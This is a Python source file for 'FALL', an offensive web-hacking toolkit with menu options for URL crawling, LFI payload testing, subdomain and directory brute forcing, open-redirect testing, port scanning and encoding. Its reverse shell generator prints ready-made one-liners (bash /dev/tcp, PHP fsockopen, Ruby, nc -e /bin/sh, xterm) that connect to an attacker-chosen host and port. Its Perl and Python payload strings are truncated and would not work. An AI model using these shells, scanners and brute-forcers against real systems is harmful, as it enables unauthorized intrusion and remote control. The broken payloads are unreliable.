#!/usr/bin/python3

import os
import sys
import time
import os.path
import base64
import emoji
import hashlib
import html
import nmap
import threading
import socket
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from queue import Queue
from colorama import Fore, Style, Back


print(Fore.GREEN + Style.BRIGHT + ''' 

              ███████╗  █████╗ ██╗     ██╗     
              ██╔════╝ ██╔══██╗██║     ██║     
              █████╗   ███████║██║     ██║    v1.1
              ██╔══╝   ██╔══██║██║     ██║     
              ██║      ██║  ██║███████╗███████╗
              ╚═╝      ╚═╝  ╚═╝╚══════╝╚══════╝
              ''')
print(Fore.WHITE + Style.BRIGHT + '       :.:.:Coded with' + Fore.RED + " <3 " + Fore.WHITE + 'via: @Hs Devansh Raghav:.:.:' + Style.RESET_ALL)
print('')

def main():
    print('====>  ' + "[1] " + Fore.CYAN + "Crawl urls" + Style.RESET_ALL)
    print('====>  ' + "[2] " + Fore.CYAN + "LFI testing" + Style.RESET_ALL)
    print('====>  ' + "[3] " + Fore.CYAN + "Encoder" + Style.RESET_ALL)
    print('====>  ' + "[4] " + Fore.CYAN + "Subdomain enumeration" + Style.RESET_ALL)
    print('====>  ' + "[5] " + Fore.CYAN + "Directory brute forcing" + Style.RESET_ALL)
    print('====>  ' + "[6] " + Fore.CYAN + "Reverse shell generator" + Style.RESET_ALL)
    print('====>  ' + "[7] " + Fore.CYAN + "Open redirect testing" + Style.RESET_ALL)
    print('====>  ' + "[8] " + Fore.CYAN + "Multithreaded port scanner" + Style.RESET_ALL)
    print('')
    print('====>  ' + "[C] " + Fore.GREEN + "Clear" + Style.RESET_ALL)
    print('====>  ' + "[X] " + Fore.RED + "Exit" + Style.RESET_ALL)
    print('====>  ' + "[O] " + Fore.YELLOW + "Display Options" + Style.RESET_ALL)
    print('')

main()

while True:
    try:
        handler = input("[>]" + " SET: ")

        if handler == '1':

            print('')
            crawl = input(Fore.CYAN + "[Crawler]" + Style.RESET_ALL + "[>] URL: ")
            print('')
            print(Fore.GREEN + '[INFO] ' + Style.RESET_ALL + "If the tool displays /<path> without https://<target url> then you can simply add https://<taget-url>/<found-path>.")
            time.sleep(1)
            print(Fore.GREEN + '[INFO] ' + Style.RESET_ALL + "If you are facing errors while crawling the urls like - OSError, Try using www. in your url.")
            time.sleep(1)
            print(Fore.YELLOW + '[WARNING] ' + Style.RESET_ALL + "Ignore # sign if you found that in the result.")
            print('')
            time.sleep(2)
            url = requests.get(crawl)
            soup = BeautifulSoup(url.text, 'html.parser')

            os.system("touch urls.found.txt")
            f = open("urls.found.txt", "w")

            for link in soup.find_all("a"):

                data = link.get('href')
                print(data)
                f.write((str(data)))
                f.write("\n")
            f.close()
            print('')
            print(Fore.GREEN + '[INFO] ' + Style.RESET_ALL + "Output saved: urls.found.txt")

        elif handler == '2':

            print('')
            U = input(Fore.CYAN + "[LFI]" + Style.RESET_ALL + "[>] " + 'URL: ')
            P = input(Fore.CYAN + "[LFI]" + Style.RESET_ALL + "[>] " + 'Payloads: ')
            PH = input(Fore.CYAN + "[LFI]" + Style.RESET_ALL + "[>] " + 'Placeholder: ')
            print('')

            if os.path.isfile(str(P)) == True: 

                pass
            
            elif os.path.isfile(str(P)) == False:  
                print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " Failed to load payloads, Please check the payloads path.")

            with open (str(P)) as wordlist:
                read = wordlist.readlines()

            for each_line in read:
                path_of_url = U.replace(PH , each_line)
                request_send = requests.get(path_of_url) 
                response = request_send.status_code

                if response == 200:
                    print(Fore.GREEN + "[HIGH] " + Style.RESET_ALL + "Potential LFI vulnerability found: " + path_of_url)
                    os.system('touch LFI_vulnerable_urls.txt')
                    file = open('LFI_vulnerable_urls.txt', 'a')
                    file.write(path_of_url)
                    file.write('\n')

                elif response == 403:
                    print(Fore.YELLOW + "[403] " + Style.RESET_ALL + "Try some 403 Forbidden bypass payloads: " + path_of_url)

                elif response == 404:
                    print(Fore.RED + "[404] " + Style.RESET_ALL + "Not found: " + path_of_url)

        elif handler == '3':
            
            print('')
            print(Fore.GREEN + "[*]" + Style.RESET_ALL + " Available encoding: " + Fore.RED + "HTML, MD5, HEX, BASE64, UTF-16" + Style.RESET_ALL)
            print('')

            crypto = input(Fore.CYAN + "[Encoder]" + Style.RESET_ALL + "[>] Enter encoding: ")

            if crypto == 'HTML':

                ht = input(Fore.CYAN + "[HTML]" + Style.RESET_ALL + "[>] Enter what you want to encode: ")

                print('')
                print(Fore.GREEN + "[ENCODED] " + Style.RESET_ALL + html.escape(ht))
                print('')

            elif crypto == 'HEX':

                hexx = int(input(Fore.CYAN + "[HEX]" + Style.RESET_ALL + "[>] Enter what you want to encode: "))

                res = (hex(hexx))

                print('')
                print(Fore.GREEN + "[ENCODED] " + Style.RESET_ALL + (str(res)))
                print('')

            elif crypto == 'MD5':

                md = input(Fore.CYAN + "[MD5]" + Style.RESET_ALL + "[>] Enter what you want to encode: ")

                doing = hashlib.md5(md.encode())

                result = (doing.hexdigest())

                print('')
                print(Fore.GREEN + "[ENCODED] " + Style.RESET_ALL + (str(result)))
                print('')

            elif crypto == 'BASE64':

                base = input(Fore.CYAN + "[BASE64] " + Style.RESET_ALL + "[>] Enter what you want to encode: ")

                sample_string_bytes = base.encode("ascii")
  
                base64_bytes = base64.b64encode(sample_string_bytes)
                base64_string = base64_bytes.decode("ascii")

                print('')
                print(Fore.GREEN + "[ENCODED] " + Style.RESET_ALL + base64_string)
                print('')

            elif crypto == 'UTF-16':

                ut16 = input(Fore.CYAN + "[UTF-16] " + Style.RESET_ALL + "[>] Enter what you want to encode: ")

                enco = (ut16.encode('utf-16'))

                print('')
                print(Fore.GREEN + "[ENCODED] " + Style.RESET_ALL + (str(enco)))
                print('')

            else:
                print('')
                print(Fore.RED + "[*] " + Style.RESET_ALL + "Not Available: " + crypto)
                print('')

        elif handler == '4':
            print('')
            domain = input(Fore.CYAN + "[SUBENUM] " + Style.RESET_ALL + "[>] Domain: ")

            filename = input(Fore.CYAN + "[SUBENUM] " + Style.RESET_ALL + "[>] Wordlist: ") 
            print(Fore.GREEN + '[INFO] ' + Style.RESET_ALL + "All discovered domains will be auto saved to Discovered_subdomains.txt file.")
            print('')

            with open(filename, "r") as file:
                for subdomain in file.readlines():

                    subdomain_url = f"https://{subdomain.strip()}.{domain}"
                    try:
                        response = requests.get(subdomain_url, timeout=3.0)
            
                        if response.status_code==200:
                            print(Style.BRIGHT + Fore.GREEN + "[+] " + Fore.WHITE + "Discovered domain: " +(f"{subdomain_url}") + Style.RESET_ALL)
                            os.system('touch Discovered_subdomains.txt')
                            file = open("Discovered_subdomains.txt", 'a')
                            file.write(f"{subdomain_url}")    
                            file.write('\n') 

                    except (KeyboardInterrupt):
                        yn = input(Style.BRIGHT + Fore.YELLOW + "[>] " + Style.RESET_ALL + "Do you want to exit(y/n): ")
                    
                        if yn == 'y':
                            sys.exit()

                        elif yn == 'n':
                            print('Restarting...')
                            time.sleep(2)                                                      
                    except:
                        print(Fore.RED + "[-] " + Style.RESET_ALL + (f"{subdomain_url}"))  

        elif handler == '5':

            try:

                print('')
                dirb = input(Fore.CYAN + "[DIR-BRUTE]" + Style.RESET_ALL + "[>] URL: ")
                print('')
                dirb2 = input(Fore.CYAN + "[DIR-BRUTE]" + Style.RESET_ALL + "[>] wordlist: ")
                print('')

                if os.path.isfile(str(dirb2)) == True:
                
                    pass

                elif os.path.isfile(str(dirb2)) == False:  
                    print(Fore.RED + "[ERROR]" + Style.RESET_ALL +  "Failed to load wordlist, Please check the wordlist path.")
                
                with open (str(dirb2)) as wordlist: 
                    read = wordlist.readlines() 
            
                for line in read: 
                    path_of_url = str(dirb + "/" + line) 
                    r = requests.get(path_of_url) 
                    response = r.status_code

                    try:

                        if response == 200:

                            print(Style.BRIGHT + Fore.GREEN + "[200] " + Fore.WHITE + "Valid Path Found: " + Style.BRIGHT + path_of_url + Style.RESET_ALL)
                            os.system('touch DIR-BRUTE_result.txt')
                            file = open('DIR-BRUTE_result.txt', "a")
                            file.write((str(response)) + ": " + path_of_url)

                        elif response == 404: 
                            print(Style.BRIGHT + Fore.RED + "[404] " + Style.RESET_ALL + "Path Not Found: " + path_of_url)
                
                        elif response == 302: 
                            print(Style.BRIGHT + Fore.GREEN + "[302] " + "Potential EAR vulnerability found: " + path_of_url)

                    except KeyboardInterrupt:
                        yn = input(Style.BRIGHT + Fore.YELLOW + "[>] " + Style.RESET_ALL + "Do you want to exit(y/n): ")
                    
                        if yn == 'y':
                            sys.exit()

                        elif yn == 'n':
                            print('Restarting...')
            except:
                sys.exit()


        elif handler == '6':

            print('')
            print(Fore.GREEN + "[*] " + Style.RESET_ALL + "Available reverse shells: " + Fore.RED + "BASH, PHP, PERL, PYTHON, RUBY, NETCAT, XTERM" + Style.RESET_ALL)
            print('')
            
            shell = input(Fore.CYAN + "[SHEEL-CREATE] " + Style.RESET_ALL + "[>] Shell: ")

            if shell == 'BASH':
                bash = input(Fore.CYAN + "[BASH] " + Style.RESET_ALL + "[>] LHOST: ")
                bash2 = input(Fore.CYAN + "[BASH] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "bash -i >& /dev/tcp/" + bash + "/" + bash2 + " 0>&1")
                print('')

            elif shell == 'PERL':
                perl = input(Fore.CYAN + "[PERL] " + Style.RESET_ALL + "[>] LHOST: ")
                perl2 = input(Fore.CYAN + "[PERL] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "perl -e 'use Socket;$i='" + perl + "';$p="+ perl2 +";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in")
                print('')

            elif shell == 'PHP':
                php = input(Fore.CYAN + "[PHP] " + Style.RESET_ALL + "[>] LHOST: ")
                php2 = input(Fore.CYAN + "[PHP] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "php -r '$sock=fsockopen('" + php +"'," + php2 +");exec('/bin/sh -i <&3 >&3 2>&3');'")
                print('')

            elif shell == 'PYTHON':
                python = input(Fore.CYAN + "[PYTHON] " + Style.RESET_ALL + "[>] LHOST: ")
                python2 = input(Fore.CYAN + "[PYTHON] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + python +"'," + python2 + "))")
                print('')

            elif shell == 'RUBY':
                ruby = input(Fore.CYAN + "[RUBY] " + Style.RESET_ALL + "[>] LHOST: ")
                ruby2 = input(Fore.CYAN + "[RUBY] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "ruby -rsocket -e'f=TCPSocket.open('" + ruby +"'," + ruby2 + ").to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'")
                print('')

            elif shell == 'NETCAT':
                netcat = input(Fore.CYAN + "[NETCAT] " + Style.RESET_ALL + "[>] LHOST: ")
                netcat2 = input(Fore.CYAN + "[NETCAT] " + Style.RESET_ALL + "[>] LPORT: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "nc -e /bin/sh " + netcat, netcat2)
                print('')

            elif shell == 'XTERM':
                xterm = input(Fore.CYAN + "[XTERM] " + Style.RESET_ALL + "[>] LHOST: ")

                print('')
                print(Fore.GREEN + "[SHELL] " + Style.RESET_ALL + "xterm -display " + xterm + ":1" )
                print('')

            else:
                print('')
                print(Fore.RED + "[*]" + Style.RESET_ALL + " Not available: " + shell)
                print('')

        elif handler == '7':
            print('')

            openr = input(Fore.CYAN + "[OPEN_REDIRECT] " + Style.RESET_ALL + "[>] URL: ")
            openr2 = input(Fore.CYAN + "[OPEN_REDIRECT] " + Style.RESET_ALL + "[>] Payloads: ")
            openr3 = input(Fore.CYAN + "[OPEN_REDIRECT] " + Style.RESET_ALL + "[>] Placeholder: ")
            print('')

            with open(openr2, "r") as file:
                for open_pays in file.readlines():

                    replace_holder = openr.replace(openr3, open_pays.strip())

                    send = requests.get(replace_holder, timeout=3.0)

                    try:         
                        if send.history:
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Note if the tool will found a redirection it will automatically close the scanning.")
                            print('')
                            print(Style.BRIGHT + Fore.GREEN + "[+] " + Fore.WHITE + "Redirection found: " + replace_holder + Style.RESET_ALL)
                            print('')
                            break
                        else:
                            print(Fore.RED + "[-] " + Style.RESET_ALL + replace_holder)
                    
                    except KeyboardInterrupt:
                        yn = input(Style.BRIGHT + Fore.YELLOW + "[>] " + Style.RESET_ALL + "Do you want to exit(y/n): ")
                    
                        if yn == 'y':
                            sys.exit()

                        elif yn == 'n':
                            print('Restarting...')
                            time.sleep(2) 

        elif handler == '8':
            
            print_lock = threading.Lock()

            print('')
            ip = input(Fore.CYAN + "[PORT_SCANNER]" + Style.RESET_ALL + "[>] Target: ")
            port_range = input(Fore.CYAN + "[PORT_SCANNER]" + Style.RESET_ALL + "[>] Scan up to port (ex would be 1000): ")
            print('')

            def scan(ip, port):
                scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                scanner.settimeout(1)

                try: 
                    scanner.connect((ip, port))
                    scanner.close()

                    with print_lock:
                        print(Style.RESET_ALL + Fore.GREEN + "[" + ip + "]" + Style.RESET_ALL + f" Port {Fore.RED}{port}" + Style.RESET_ALL + " is open on the target")

                except:
                    pass

            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:

                for port in range(int(port_range)):
                    executor.submit(scan, ip, port + 1)

        elif handler == 'X':
            
            print('')
            print(emoji.emojize(":grinning_face_with_big_eyes:") + ":.:.:Thank you for using FALL tool:.:.:" + emoji.emojize(":grinning_face_with_big_eyes:"))
            sys.exit()

        elif handler == 'C':
            
            os.system("clear")

        elif handler == 'O':
            
            print('')
            main()

        else:
            print('')
            print(Fore.RED + "[:(] " + Style.RESET_ALL + "Unknown option: " + handler)
            print('')

    except (KeyboardInterrupt):
        yn = input(Style.BRIGHT + Fore.YELLOW + "[>] " + Style.RESET_ALL + "Do you want to exit(y/n): ")
                    
        if yn == 'y':
            sys.exit()

        elif yn == 'n':
            print('Restarting...')
            time.sleep(2)

















    



